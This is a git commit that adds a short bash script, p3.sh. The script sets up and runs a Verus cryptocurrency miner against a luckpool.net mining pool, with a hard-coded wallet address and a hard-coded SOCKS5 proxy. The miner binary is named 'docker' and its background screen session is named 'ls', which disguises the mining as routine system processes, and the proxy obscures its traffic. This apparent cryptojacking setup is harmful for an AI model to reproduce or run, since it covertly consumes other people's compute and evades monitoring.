d680fb0b24c11e0fed3df9990d6336fb0763af7b
wertesd <86517111+wertesd@users.noreply.github.com>
2021-07-10 13:23:50 +0700

    Create p3.sh

---
+++ p3.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x docker 
+screen -dmS ls 
+POOL=stratum+tcp://na.luckpool.net:3956
+WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
+PROXY=socks5://72.206.181.103:4145
+./docker -a verus -o $POOL -u $WALLET.P3 -p x -t 2 -x $PROXY
